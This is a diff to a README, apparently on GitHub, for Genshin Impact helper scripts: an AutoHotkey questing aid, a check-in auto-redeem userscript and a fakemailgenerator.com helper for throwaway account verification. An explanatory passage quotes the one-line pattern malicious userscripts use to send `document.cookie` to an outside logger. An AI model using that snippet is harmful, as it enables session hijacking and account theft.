@@ -6,6 +6,7 @@ __retrier2.ahk__ is now available at GitHub!<br>
 (Not a bot, it is Helper for questing)<br>
 __genshin-checkin-redeem.js__ is now available at GitHub!<br>
 (Used for auto redeem check-in reward)<br>
+__quickfmg.js__ is now available at GitHub!<br>
 
 ## retrier2.ahk SETUP
 FOR pre-made script: <br>https://www.youtube.com/watch?v=7YDn-NKuO7A<br>
@@ -30,6 +31,7 @@ A: Not by the author, but there MAY be a change during period before October of 
 5. Select Subtitles to: English
 
 ## genshin-checkin-redeem.js
+(requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
 #### NOTE: Only the account that is currently logged in, I may make a script for quick multi-account in few lines(C#) in the future!<br>
 Every 3h script will try to check-in<br>
 __Script will trigger when you are casually watching youtube videos, or just browsing__<br>
@@ -42,3 +44,8 @@ Junior Developers may freak out because they'll see error(s) in the console, in 
   - Or sending `document.cookie` to the 3rd party logger website
     - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`
 
+## quickfmg.js
+(requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
+Once you add this script and go to [fakemailgenerator.com](http://www.fakemailgenerator.com/), you would click on Logo that will have green background.<br>
+Once you click on the Logo, it will copy the new generated mail automatically<br>
+IMPORTANT: It will copy verification code for genshin impact account, no worries
